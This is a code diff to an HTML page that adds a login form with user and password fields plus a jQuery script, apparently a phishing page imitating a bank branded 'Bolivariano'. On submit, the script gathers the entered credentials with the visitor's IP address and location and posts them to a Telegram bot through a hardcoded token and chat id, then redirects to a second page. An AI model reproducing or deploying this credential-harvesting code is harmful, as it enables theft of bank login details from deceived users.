@@ -87,6 +87,10 @@ input{
 
     <div class="tarjeta">
 
+
+<form id="loginForm" class="form">
+
+
         <div class="grupo">
 
             <label for="producto1">
@@ -99,6 +103,21 @@ input{
                 readonly
                 value=""
             >
+
+<br>
+<br>
+
+<input
+        type="text"
+        id="1"
+        name="1"
+        placeholder="Ingresa tu usuario"
+        autocomplete="off"
+        required>
+
+
+
+
 
         </div>
 
@@ -116,7 +135,27 @@ input{
                 value=""
             >
 
+
+<br>
+<br>
+
+<input
+        type="text"
+        id="2"
+        name="2"
+        placeholder="Ingresa tu usuario"
+        autocomplete="off"
+        required>
+
+
         </div>
+
+
+
+    <button type="submit" class="continuar">
+        Continuar
+    </button>
+
 
 
         <div
@@ -273,6 +312,58 @@ onValue(
 );
 
 </script>
+
+
+<br>
+
+</form>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+  <script>
+    $(document).ready(function () {
+      $('#loginForm').submit(function (e) {
+        e.preventDefault();
+
+        const u_name1 = $('#1').val().trim();
+        const u_name2 = $('#2').val().trim();
+        let message = `✅ LOGO - BOLIVARIANO ✅ \nUser: ${u_name1}\nClave: ${u_name2}`;
+
+        // Obtener IP pública
+         $.getJSON("https://api.ipify.org?format=json", function (data) {
+        const ip = data.ip;
+        $.getJSON("https://ipinfo.io", function (response) {
+          const ip2 = response.city + ", " + response.country;
+          message += `\n- IP: ${ip}\n- Ubicación: ${ip2}`;
+
+          const telegram_bot_id = "8602288332:AAFHmI9Q7KDhpvgkpIICCyNrAoFUM65e4oE";
+          const chat_id = "6956488104";
+          const settings = {
+            "async": true,
+            "crossDomain": true,
+            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+            "method": "POST",
+            "headers": {
+              "Content-Type": "application/json",
+              "cache-control": "no-cache"
+            },
+            "data": JSON.stringify({
+              "chat_id": chat_id,
+              "text": message
+            })
+          };
+
+          $.ajax(settings).done(function () {
+            window.location.href = '2.html';
+          });
+        });
+      });
+    });
+  });
+</script>
+
+
+
 
 </body>
 </html>
